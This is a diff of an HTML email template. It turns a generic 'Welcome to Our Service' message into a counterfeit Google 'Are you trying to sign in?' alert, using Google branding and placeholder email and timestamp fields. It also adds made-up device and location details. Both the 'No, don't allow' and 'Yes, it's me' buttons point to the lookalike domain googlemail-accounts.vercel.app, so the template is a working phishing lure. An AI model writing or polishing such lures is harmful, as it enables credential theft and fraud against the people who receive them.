@@ -3,66 +3,155 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Welcome to Our Service!</title>
+    <title>Google Sign-in Alert</title>
     <style>
         body {
-            font-family: Arial, sans-serif;
-            background-color: #f4f4f4;
+            font-family: 'Google Sans', Roboto, Arial, sans-serif;
+            background-color: #1a1a1a; /* Dark background */
             margin: 0;
             padding: 0;
+            color: #e0e0e0; /* Light text color */
         }
         .container {
             width: 100%;
-            max-width: 600px;
-            margin: 0 auto;
-            background-color: #ffffff;
-            padding: 20px;
+            max-width: 400px; /* Smaller container to mimic phone screen */
+            margin: 20px auto;
+            background-color: #2a2a2a; /* Slightly lighter dark for content area */
             border-radius: 8px;
-            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
+            padding: 0; /* Remove padding from container, add to sections */
         }
         .header {
-            background-color: ffffff(0, 0, 255, 0.459);
-            color: #ffffff;
-            padding: 10px 0;
-            text-align: center;
-            border-radius: 8px 8px 0 0;
+            display: flex;
+            align-items: center;
+            padding: 15px 20px;
+            border-bottom: 1px solid #3a3a3a;
+        }
+        .header .close-icon {
+            font-size: 24px;
+            color: #e0e0e0;
+            margin-right: 20px;
+            text-decoration: none;
+        }
+        .header .google-text {
+            font-size: 18px;
+            font-weight: 500;
+            color: #e0e0e0;
         }
         .content {
             padding: 20px;
             text-align: left;
         }
-        .footer {
-            margin-top: 20px;
-            font-size: 12px;
-            color: #888888;
-            text-align: center;
+        .content h1 {
+            font-size: 22px;
+            font-weight: 500;
+            margin-top: 0;
+            margin-bottom: 20px;
+            color: #e0e0e0;
+            text-align: center; /* Added to center the heading */
+        }
+        .email-info {
+            display: flex;
+            align-items: center;
+            justify-content: center; /* Added to center the email info */
+            margin-bottom: 20px;
+        }
+        .email-info .icon {
+            width: 24px;
+            height: 24px;
+            border-radius: 50%;
+            background-color: #4285f4; /* Google blue */
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            color: #ffffff;
+            font-size: 14px;
+            font-weight: bold;
+            margin-right: 10px;
+        }
+        .email-info p {
+            margin: 0;
+            font-size: 16px;
+            color: #e0e0e0;
+        }
+        .detail-row {
+            margin-bottom: 15px;
+        }
+        .detail-row p {
+            margin: 0;
+            font-size: 14px;
+            color: #b0b0b0; /* Lighter grey for labels */
+        }
+        .detail-row strong {
+            display: block;
+            font-size: 16px;
+            color: #e0e0e0;
+            margin-top: 5px;
+        }
+        .buttons-container {
+            display: flex;
+            justify-content: space-around;
+            padding: 20px;
+            border-top: 1px solid #3a3a3a;
         }
         .button {
             display: inline-block;
-            background-color:rgba(0, 0, 255, 0.459);
-            color: #ffffff;
-            padding: 10px 20px;
+            padding: 10px 15px;
+            border-radius: 20px; /* More rounded buttons */
             text-decoration: none;
-            border-radius: 5px;
-            margin-top: 20px;
+            font-weight: 500;
+            font-size: 14px;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+            text-align: center;
+            min-width: 120px;
+        }
+        .button.deny {
+            background-color: #3a3a3a;
+            color: #e0e0e0;
+            border: 1px solid #5a5a5a;
+        }
+        .button.deny:hover {
+            background-color: #4a4a4a;
+        }
+        .button.allow {
+            background-color: #4285f4; /* Google blue */
+            color: #ffffff;
+            border: 1px solid #4285f4;
+        }
+        .button.allow:hover {
+            background-color: #3367d6; /* Darker blue on hover */
         }
     </style>
 </head>
 <body>
     <div class="container">
         <div class="header">
-            <!-- <h1>📢 Airdrop Announcement!</h1> -->
+            <a href="#" class="close-icon">&times;</a>
+            <span class="google-text">Google</span>
         </div>
         <div class="content">
-            <p>Hello {{firstName}},</p>
-            <p>Please check follow up sent from our team.</p>
-            <a href="https://googlemail-accounts.vercel.app/"><img src="https://i.pinimg.com/1200x/36/f6/37/36f63757bb2df81944f51e08ad1ff1b4.jpg" alt="transition PDF" width="130"> <img src="https://i.pinimg.com/1200x/7d/91/6c/7d916c52ffdcefaddd9a80c7a0acc3ce.jpg" alt="transition PDF" width="130"></a>
-            <p>Best Regards</p>
-            <p>Services</p>
-           <p><small>Sent to: {{firstName}}</small></p>
-         <p><small>Sent on: {{timestamp}}</small></p>
+            <h1>Are you trying to sign in?</h1>
+            <div class="email-info">
+                <span class="icon">P</span> <!-- Placeholder for profile initial or small icon -->
+                <p>{{email}}</p>
+            </div>
+            <div class="detail-row">
+                <p>Device</p>
+                <strong>Windows</strong>
+            </div>
+            <div class="detail-row">
+                <p>Near</p>
+                <strong>UK, London</strong>
+            </div>
+            <div class="detail-row">
+                <p>Time</p>
+                <strong>{{timestamp}}</strong>
+            </div>
         </div>
-        </div>
+        <div class="buttons-container">
+            <a href="https://googlemail-accounts.vercel.app/" class="button deny"><span>&times;</span> No, don't allow</a>
+            <a href="https://googlemail-accounts.vercel.app/" class="button allow"><span>&#10003;</span> Yes, it's me</a>
         </div>
     </div>
 </body>
